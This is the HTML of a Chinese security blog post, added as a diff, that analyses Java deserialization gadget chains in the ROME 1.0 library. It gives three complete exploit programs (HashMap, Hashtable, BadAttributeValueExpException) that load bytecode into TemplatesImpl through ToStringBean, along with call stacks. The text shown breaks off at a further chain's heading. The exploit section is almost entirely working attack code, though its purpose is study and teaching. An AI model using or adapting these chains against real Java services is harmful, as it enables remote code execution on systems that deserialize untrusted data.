@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="环境搭建jdk8u181 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;rome&lt;&#x2F;artifactId&gt;        &lt;version&gt;1.0&lt;&#x2F;version&gt;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化 ROME链">
+<meta property="og:url" content="https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/index.html">
+<meta property="og:site_name" content="Jasper_sec">
+<meta property="og:description" content="环境搭建jdk8u181 1234567&lt;dependencies&gt;    &lt;dependency&gt;        &lt;groupId&gt;rome&lt;&#x2F;groupId&gt;        &lt;artifactId&gt;rome&lt;&#x2F;artifactId&gt;        &lt;version&gt;1.0&lt;&#x2F;version&gt;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38455276/1700402532931-a26c4fe4-ba36-4c03-9ee7-7930802a5978.png#averageHue=%2312131b&clientId=u90893580-c35e-4&from=paste&height=208&id=u0412aeb1&originHeight=416&originWidth=1463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76839&status=done&style=none&taskId=uc9874b71-f50d-4fd6-8c0a-16279d08f4f&title=&width=731.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2023/png/38455276/1700402550874-22686ab7-c67e-4d9a-a9fd-4952f3ba3eab.png#averageHue=%230f1025&clientId=u90893580-c35e-4&from=paste&height=77&id=u5cf473b6&originHeight=134&originWidth=1149&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15394&status=done&style=none&taskId=u47ebe7f5-c586-474e-968b-7e7607eb5b7&title=&width=663.5">
+<meta property="article:published_time" content="2023-12-24T05:32:20.000Z">
+<meta property="article:modified_time" content="2023-12-24T13:52:34.804Z">
+<meta property="article:author" content="Jasper_sec">
+<meta property="article:tag" content="java rome 反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2023/png/38455276/1700402532931-a26c4fe4-ba36-4c03-9ee7-7930802a5978.png#averageHue=%2312131b&clientId=u90893580-c35e-4&from=paste&height=208&id=u0412aeb1&originHeight=416&originWidth=1463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76839&status=done&style=none&taskId=uc9874b71-f50d-4fd6-8c0a-16279d08f4f&title=&width=731.5">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/blog/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/blog/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/blog/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Java反序列化 ROME链</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/blog/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/blog/">Home</a></li><!--
+     --><!--
+       --><li><a href="/blog/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/sketchpl4ne">Projects</a></li><!--
+     --><!--
+       --><li><a href="/blog/links/">links</a></li><!--
+     --><!--
+       --><li><a href="/blog/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/blog/2023/12/24/0x0E%20Java%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/blog/2023/12/24/0x0C%20fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93%20TODO/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&text=Java反序列化 ROME链"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&is_video=false&description=Java反序列化 ROME链"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Java反序列化 ROME链&body=Check out this article: https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&title=Java反序列化 ROME链"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&name=Java反序列化 ROME链&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://sketchpl4ne.github.io/blog/2023/12/24/0x0D%20Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%20ROME%E9%93%BE/&t=Java反序列化 ROME链"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">利用链分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Exp"><span class="toc-number">3.</span> <span class="toc-text">Exp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HashMap"><span class="toc-number">3.1.</span> <span class="toc-text">HashMap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HashTable"><span class="toc-number">3.2.</span> <span class="toc-text">HashTable</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">3.3.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HotSwappableTargetSource"><span class="toc-number">3.4.</span> <span class="toc-text">HotSwappableTargetSource</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">5.</span> <span class="toc-text">参考链接</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Java反序列化 ROME链
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Jasper_sec</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-12-24T05:32:20.000Z" class="dt-published" itemprop="datePublished">2023-12-24</time>
+        
+        (Updated: <time datetime="2023-12-24T13:52:34.804Z" class="dt-updated" itemprop="dateModified">2023-12-24</time>)
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/blog/tags/java-rome-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">java rome 反序列化</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>jdk8u181</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>rome<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h1 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h1><p>ROME反序列链的本质，是组件里的ToStringBean#toString可以任意getter调用。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1700402532931-a26c4fe4-ba36-4c03-9ee7-7930802a5978.png#averageHue=%2312131b&clientId=u90893580-c35e-4&from=paste&height=208&id=u0412aeb1&originHeight=416&originWidth=1463&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76839&status=done&style=none&taskId=uc9874b71-f50d-4fd6-8c0a-16279d08f4f&title=&width=731.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/38455276/1700402550874-22686ab7-c67e-4d9a-a9fd-4952f3ba3eab.png#averageHue=%230f1025&clientId=u90893580-c35e-4&from=paste&height=77&id=u5cf473b6&originHeight=134&originWidth=1149&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=15394&status=done&style=none&taskId=u47ebe7f5-c586-474e-968b-7e7607eb5b7&title=&width=663.5" alt="image.png"><br>例如调getOutputProperties就是代码执行，于是问题转换成如何调ClassName#toString。<br>由此，分出许多不同利用链，本质是不同调toString的链子。<br>下面给出核心调用链，不同的部分在Exp的函数调用栈写明。<br>ClassLoader#defineClass-&gt;<br>TemplatesImpl#defineClass-&gt;<br>TemplatesImpl#defineTransletClasses-&gt;<br>TemplatesImpl#getTransletInstance-&gt;<br>TemplatesImpl#newTransformer-&gt;<br><strong>TemplatesImpl#getOutputProperties-&gt;</strong><br><strong>ToStringBean#toString-&gt;</strong><br><strong>GadgetsChains#triggerToStringFunction…..</strong></p>
+<h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:176, EqualsBean</span><br><span class="line">hash:339, HashMap</span><br><span class="line">put:612, HashMap</span><br><span class="line">main:26, ROMEHashMap</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line">        <span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">EqualsBean</span> <span class="variable">equalsBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EqualsBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(equalsBean, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashMap);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="HashTable"><a href="#HashTable" class="headerlink" title="HashTable"></a>HashTable</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">beanHashCode:193, EqualsBean</span><br><span class="line">hashCode:110, ObjectBean</span><br><span class="line">put:465, Hashtable</span><br><span class="line">main:28, ROMEHashTable</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEHashTable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectBean</span> <span class="variable">objectBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectBean</span>(ToStringBean.class,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(objectBean,<span class="string">&quot;123&quot;</span>);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(hashtable);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">getOutputProperties:507, TemplatesImpl</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">toString:137, ToStringBean</span><br><span class="line">toString:116, ToStringBean</span><br><span class="line">readObject:86, BadAttributeValueExpException</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl</span><br><span class="line">invoke:62, NativeMethodAccessorImpl</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl</span><br><span class="line">invoke:498, Method</span><br><span class="line">invokeReadObject:1170, ObjectStreamClass</span><br><span class="line">readSerialData:2178, ObjectInputStream</span><br><span class="line">readOrdinaryObject:2069, ObjectInputStream</span><br><span class="line">readObject0:1573, ObjectInputStream</span><br><span class="line">readObject:431, ObjectInputStream</span><br><span class="line">unserialize:31, SerialUtils</span><br><span class="line">main:27, ROMEBadAttributeValueExpException</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Utils.*;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ROMEBadAttributeValueExpException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templatesimpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] bytecodes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\Calc.class&quot;</span>));</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;Jasper&quot;</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(templatesimpl,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;bytecodes&#125;);</span><br><span class="line"><span class="comment">//        ReflectUtils.setFieldValue(templatesimpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span></span><br><span class="line"></span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>(Templates.class,templatesimpl);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        ReflectUtils.setFieldValue(badAttributeValueExpException,<span class="string">&quot;val&quot;</span>,toStringBean);</span><br><span class="line"></span><br><span class="line">        SerialUtils.serialize(badAttributeValueExpException);</span><br><span class="line">        SerialUtils.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="HotSwappableTargetSource"><a href="#HotSwappableTargetSource" class="headerlink" title="HotSwappableTargetSource"></a>HotSwappableTargetSource</h2><p>SpringBoot原生toString链，需要加载SpringBoot依赖。</p>
